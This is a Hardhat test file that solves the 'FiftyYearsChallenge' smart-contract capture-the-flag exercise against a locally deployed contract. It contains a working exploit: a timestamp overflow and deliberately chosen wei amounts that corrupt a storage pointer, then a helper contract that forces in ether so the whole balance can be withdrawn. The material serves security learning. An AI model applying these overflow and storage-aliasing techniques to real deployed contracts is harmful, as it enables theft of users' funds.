const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("FiftyYearsChallenge", async function () {
    let contract;
    let player;

    before(async function () {
        player = await ethers.getSigner();
        contract = await (await ethers.getContractFactory("FiftyYearsChallenge")).deploy(player.address, { value: ethers.utils.parseEther("1") });
    });

    it("Exploit", async function () {
        // WRITE YOUR CODE HERE
        const overflowingTimestamp = ethers.BigNumber.from(2) // use this in order to pass the timestamp check on lines 37-39 the second time we call .upsert
            .pow(256)
            .sub(24 * 60 * 60);

        // We send 1 wei because the contribution.amount on line 41 actually represents a pointer to the queue.length at storage slot 2
        await contract.upsert(1, overflowingTimestamp, { value: 1 });

        // Here the timestamp check on lines 37-39 will overflow
        // We send 2 wei for the reason described above
        await contract.upsert(2, 0, { value: 2 });

        // Since the issue described on lines 48-50 we have to send 2 additional wei to the contract in order to later withdraw all contributions amounts
        await (await ethers.getContractFactory("FiftyYearsChallengeHelper")).deploy(contract.address, { value: 2 });

        await contract.withdraw(2);
    });

    after(async function () {
        expect(await contract.isComplete()).to.be.true;
    });
});